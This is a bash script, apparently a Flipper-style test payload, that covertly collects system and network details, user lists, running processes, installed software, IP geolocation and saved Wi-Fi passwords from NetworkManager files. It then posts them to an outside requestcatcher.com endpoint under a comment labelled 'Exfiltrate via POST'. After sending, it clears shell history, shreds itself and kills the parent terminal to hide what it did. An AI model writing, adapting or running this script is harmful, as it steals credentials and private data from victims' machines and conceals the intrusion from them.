#!/bin/bash

# === Basic System Info ===
os_info=$(lsb_release -a 2>/dev/null)
kernel_info=$(uname -a)
hostname_info=$(hostnamectl)
current_user=$(whoami)

# === Network Info ===
public_ip=$(curl -s https://ipinfo.io/ip)
local_ip=$(hostname -I)
mac_address=$(ip link | grep -A1 "state UP" | grep ether | awk '{print $2}')
wifi_networks=$(nmcli -f SSID,BSSID,SIGNAL dev wifi list 2>/dev/null)
wifi_profiles=$(grep -r '^psk=' /etc/NetworkManager/system-connections/ 2>/dev/null)

# === Geolocation (IP-based) ===
location_data=$(curl -s https://ipinfo.io/loc)

# === Users and Groups ===
user_list=$(cut -d: -f1 /etc/passwd)
group_info=$(groups)
password_policy=$(chage -l "$current_user" 2>/dev/null)

# === Processes, Services, Software ===
running_processes=$(ps aux)
enabled_services=$(systemctl list-unit-files --type=service --state=enabled)
installed_software=$(dpkg-query -W -f='${binary:Package} ${Version}\n')
disk_info=$(lsblk)
serial_devices=$(dmesg | grep tty)
tcp_connections=$(ss -tunapl)

# === Exfiltrate via POST ===
curl -s -X POST https://nina-flip-test.requestcatcher.com/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "debug=
==== OS INFO ====
$os_info

==== KERNEL ====
$kernel_info

==== HOSTNAME ====
$hostname_info

==== USER ====
$current_user

==== PUBLIC IP ====
$public_ip

==== LOCAL IP ====
$local_ip

==== MAC ====
$mac_address

==== WIFI NETWORKS ====
$wifi_networks

==== WIFI PROFILES ====
$wifi_profiles

==== LOCATION ====
$location_data

==== USERS ====
$user_list

==== GROUPS ====
$group_info

==== PASS POLICY ====
$password_policy

==== PROCESSES ====
$running_processes

==== SERVICES ====
$enabled_services

==== SOFTWARE ====
$installed_software

==== DISKS ====
$disk_info

==== SERIAL ====
$serial_devices

==== TCP ====
$tcp_connections
"

# === Cleanup ===
history -c
unset HISTFILE
> ~/.bash_history 2>/dev/null
> ~/.zsh_history 2>/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
export HISTCONTROL=ignorespace:erasedups

reset
clear

# Self-delete if written to disk
[ -f "$0" ] && { shred -u "$0" 2>/dev/null || rm -f "$0"; }

# Auto-close terminal silently
sleep 0.5
kill -9 $PPID
